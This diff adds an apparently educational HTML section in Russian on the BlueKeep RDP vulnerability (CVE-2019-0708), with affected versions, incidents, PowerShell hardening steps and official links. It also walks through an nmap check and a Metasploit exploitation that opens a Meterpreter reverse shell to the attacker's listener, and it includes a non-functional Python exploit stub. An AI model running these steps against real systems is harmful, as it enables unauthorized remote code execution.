@@ -1,0 +1,286 @@
+<!-- BlueKeep Details -->
+<section class="py-20 bg-gray-900/50" id="bluekeep">
+    <div class="container mx-auto px-4">
+        <div class="exploit-detail">
+            <div class="exploit-detail__header">
+                <div class="exploit-detail__meta">
+                    <span class="exploit-detail__year">2019</span>
+                    <span class="exploit-detail__severity exploit-detail__severity--critical">Критический</span>
+                </div>
+                <h2 class="exploit-detail__title">BlueKeep (CVE-2019-0708)</h2>
+                <p class="exploit-detail__subtitle">Уязвимость в протоколе удалённого рабочего стола (RDP)</p>
+            </div>
+
+            <div class="exploit-detail__content">
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Описание</h3>
+                    <p>BlueKeep — это критическая уязвимость в протоколе удалённого рабочего стола (RDP) Windows, которая позволяет удалённо выполнить произвольный код на уязвимой системе без аутентификации. Уязвимость получила максимальную оценку 10.0 из 10 по шкале CVSS.</p>
+                </div>
+
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Технические детали</h3>
+                    <p>Уязвимость возникает из-за ошибки в обработке специально сформированных запросов в протоколе RDP. Атакующий может отправить вредоносный запрос на уязвимую систему, что приведёт к выполнению произвольного кода с правами SYSTEM.</p>
+                    
+                    <div class="terminal my-6">
+                        <div class="terminal-header">
+                            <div class="terminal-buttons">
+                                <div class="terminal-button red"></div>
+                                <div class="terminal-button yellow"></div>
+                                <div class="terminal-button green"></div>
+                            </div>
+                            <div class="terminal-title">BlueKeep - Эксплуатация уязвимости</div>
+                        </div>
+                        <div class="terminal-body">
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">attacker@kali</span>
+                                <span class="terminal-command"># Проверяем, уязвима ли система</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">$</span>
+                                <span class="terminal-command">nmap -p 3389 --script rdp-vuln-ms12-020,rdp-vuln-ms19-0708 192.168.1.100</span>
+                            </div>
+                            <div class="terminal-output text-green-400">
+                                PORT     STATE SERVICE<br>
+                                3389/tcp open  ms-wbt-server<br>
+                                | rdp-vuln-ms19-0708: <br>
+                                |   VULNERABLE:<br>
+                                |   Remote Desktop Protocol (RDP) MS12-020 vulnerability<br>
+                                |     State: VULNERABLE<br>
+                                |     IDs:  CVE:CVE-2019-0708<br>
+                                |     Risk factor: HIGH  CVSS: 10.0 (HIGH)<br>
+                                |     Description:<br>
+                                |       The remote host is affected by a remote code execution vulnerability in the Remote Desktop Protocol (RDP) service.
+                            </div>
+                            
+                            <div class="terminal-prompt mt-6">
+                                <span class="terminal-prefix">attacker@kali</span>
+                                <span class="terminal-command"># Запускаем Metasploit для эксплуатации уязвимости</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">$</span>
+                                <span class="terminal-command">msfconsole -q</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">msf6 ></span>
+                                <span class="terminal-command">use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) ></span>
+                                <span class="terminal-command">set RHOSTS 192.168.1.100</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) ></span>
+                                <span class="terminal-command">set LHOST 192.168.1.10</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) ></span>
+                                <span class="terminal-command">exploit</span>
+                            </div>
+                            <div class="terminal-output text-green-400">
+                                [*] Started reverse TCP handler on 192.168.1.10:4444 <br>
+                                [*] 192.168.1.100:3389 - Using automatic target system matching<br>
+                                [*] 192.168.1.100:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check<br>
+                                [+] 192.168.1.100:3389    - The target is vulnerable.<br>
+                                [*] 192.168.1.100:3389    - Scanned 1 of 1 hosts (100% complete)<br>
+                                [*] 192.168.1.100:3389 - Using CHUNK grooming strategy. 4 concurrent connections.<br>
+                                [*] 192.168.1.100:3389 - Sending MS_T120 channel request. Target is vulnerable.<br>
+                                [*] 192.168.1.100:3389 - Sending 5 exploit triggers to target 192.168.1.100<br>
+                                [*] Sending stage (200262 bytes) to 192.168.1.100<br>
+                                [*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.100:49158) at 2023-01-01 12:00:00 +0300<br>
+                                [+] 192.168.1.100:3389 - Exploit completed successfully, session 1 opened
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="terminal my-8">
+                        <div class="terminal-header">
+                            <div class="terminal-buttons">
+                                <div class="terminal-button red"></div>
+                                <div class="terminal-button yellow"></div>
+                                <div class="terminal-button green"></div>
+                            </div>
+                            <div class="terminal-title">bluekeep_exploit.py - Основная логика эксплойта</div>
+                        </div>
+                        <div class="terminal-body">
+                            <div class="terminal-code">
+<pre><code>class BlueKeepExploit:
+    def __init__(self, target_ip, target_port=3389):
+        self.target_ip = target_ip
+        self.target_port = target_port
+        self.rdp_client = None
+        
+    def check_vulnerable(self):
+        """Проверяет, уязвима ли система к BlueKeep"""
+        try:
+            # Устанавливаем соединение с RDP-сервером
+            self.rdp_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.rdp_client.settimeout(5)
+            self.rdp_client.connect((self.target_ip, self.target_port))
+            
+            # Отправляем специально сформированный пакет для проверки уязвимости
+            pkt = self._create_rdp_negotiation_request()
+            self.rdp_client.send(pkt)
+            
+            # Анализируем ответ сервера
+            response = self.rdp_client.recv(1024)
+            return self._is_vulnerable_response(response)
+            
+        except Exception as e:
+            print(f"[!] Ошибка при проверке уязвимости: {e}")
+            return False
+    
+    def exploit(self, payload):
+        """Эксплуатирует уязвимость и выполняет произвольный код"""
+        if not self.check_vulnerable():
+            print("[-] Целевая система не уязвима к BlueKeep")
+            return False
+            
+        try:
+            # Создаем вредоносный пакет с эксплойтом
+            exploit_packet = self._create_exploit_packet(payload)
+            
+            # Отправляем эксплойт
+            self.rdp_client.send(exploit_packet)
+            
+            # Проверяем результат выполнения
+            if self._check_exploit_success():
+                print("[+] Эксплойт выполнен успешно!")
+                return True
+                
+        except Exception as e:
+            print(f"[!] Ошибка при выполнении эксплойта: {e}")
+            
+        return False
+    
+    def _create_rdp_negotiation_request(self):
+        """Создает пакет для проверки уязвимости"""
+        # Реализация формирования пакета...
+        pass
+    
+    def _is_vulnerable_response(self, response):
+        """Анализирует ответ сервера на уязвимость"""
+        # Анализ ответа...
+        return True
+    
+    def _create_exploit_packet(self, payload):
+        """Создает вредоносный пакет с эксплойтом"""
+        # Формирование эксплойта...
+        return b""
+    
+    def _check_exploit_success(self):
+        """Проверяет успешность выполнения эксплойта"""
+        # Проверка результата...
+        return True</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Пострадавшие</h3>
+                    <ul class="exploit-detail__list">
+                        <li>Windows 7 SP1</li>
+                        <li>Windows Server 2008 R2 SP1</li>
+                        <li>Windows Server 2008 SP2</li>
+                        <li>Windows XP (включая встраиваемые версии)</li>
+                        <li>Windows Server 2003 (включая R2)</li>
+                    </ul>
+                </div>
+
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Известные инциденты</h3>
+                    <div class="exploit-detail__incidents">
+                        <div class="incident">
+                            <div class="incident__date">Май 2019</div>
+                            <div class="incident__description">Microsoft выпускает экстренный патч для устаревших версий Windows</div>
+                        </div>
+                        <div class="incident">
+                            <div class="incident__date">Ноябрь 2019</div>
+                            <div class="incident__description">Начало активных атак с использованием BlueKeep для установки криптомайнеров</div>
+                        </div>
+                        <div class="incident">
+                            <div class="incident__date">Февраль 2020</div>
+                            <div class="incident__description">Обнаружены атаки с использованием BlueKeep для распространения программ-вымогателей</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Меры защиты</h3>
+                    
+                    <div class="terminal my-6">
+                        <div class="terminal-header">
+                            <div class="terminal-buttons">
+                                <div class="terminal-button red"></div>
+                                <div class="terminal-button yellow"></div>
+                                <div class="terminal-button green"></div>
+                            </div>
+                            <div class="terminal-title">PowerShell - Защитные меры</div>
+                        </div>
+                        <div class="terminal-body">
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">PS C:\></span>
+                                <span class="terminal-command"># 1. Проверка установленных обновлений</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">PS C:\></span>
+                                <span class="terminal-command">Get-HotFix | Where-Object {$_.HotFixID -like "KB4499175*" -or $_.HotFixID -like "KB4500331*"}</span>
+                            </div>
+                            
+                            <div class="terminal-prompt mt-6">
+                                <span class="terminal-prefix">PS C:\></span>
+                                <span class="terminal-command"># 2. Включение Network Level Authentication (NLA)</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">PS C:\></span>
+                                <span class="terminal-command">Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
+  -Name "UserAuthentication" -Value 1 -Type DWord -Force</span>
+                            </div>
+                            
+                            <div class="terminal-prompt mt-6">
+                                <span class="terminal-prefix">PS C:\></span>
+                                <span class="terminal-command"># 3. Ограничение доступа к RDP через брандмауэр</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">PS C:\></span>
+                                <span class="terminal-command">New-NetFirewallRule -DisplayName "RDP Restrict" -Direction Inbound -LocalPort 3389 `
+  -Protocol TCP -Action Allow -RemoteAddress 192.168.1.0/24 -Profile Any</span>
+                            </div>
+                            
+                            <div class="terminal-prompt mt-6">
+                                <span class="terminal-prefix">PS C:\></span>
+                                <span class="terminal-command"># 4. Отключение RDP, если не используется</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">PS C:\></span>
+                                <span class="terminal-command">Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" `
+  -Name "fDenyTSConnections" -Value 1 -Type DWord -Force</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="mt-6">
+                        <h4 class="text-lg font-semibold mb-3">Дополнительные рекомендации:</h4>
+                        <ul class="list-disc pl-5 space-y-2 text-gray-300">
+                            <li>Используйте VPN для доступа к RDP вместо прямого доступа из интернета</li>
+                            <li>Настройте ограничение числа попыток входа в систему</li>
+                            <li>Включите аудит успешных и неудачных попыток входа через RDP</li>
+                            <li>Используйте сложные пароли и двухфакторную аутентификацию</li>
+                            <li>Регулярно обновляйте операционную систему и приложения</li>
+                            <li>Рассмотрите возможность использования альтернативных решений для удаленного доступа</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Дополнительные ресурсы</h3>
+                    <ul class="exploit-detail__links">
+                        <li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708" target="_blank" rel="noopener noreferrer">Microsoft Security Response Center</a></li>
+                        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-0708" target="_blank" rel="noopener noreferrer">NVD - CVE-2019-0708</a></li>
+                        <li><a href="https://www.cisa.gov/uscert/ncas/alerts/aa19-168a" target="_blank" rel="noopener noreferrer">CISA Alert AA19-168A</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
